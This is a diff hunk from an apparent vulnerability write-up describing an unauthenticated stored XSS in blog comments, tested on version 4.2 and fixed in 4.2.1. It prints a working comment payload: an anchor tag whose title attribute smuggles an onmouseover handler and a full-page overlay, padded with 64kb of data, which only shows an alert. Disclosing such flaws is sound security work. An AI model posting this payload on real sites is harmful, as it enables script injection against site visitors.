@@ -31,14 +31,15 @@ After clicking update, click view post- you will get the XSS alert
 
 Exploit 3: Unauthenticated XSS in comment
 
-Summary: 
+Summary:
+
 Vulnerability Type: XSS
 Test Version: 4.2
 Fixed Version: 4.2.1
 
 Steps:
-
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>
+Comment on a post with the following script
+<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute; left:0; top:0; width:5000px; height:5000px  <insert 64kb of random data>'></a>
 
 
 
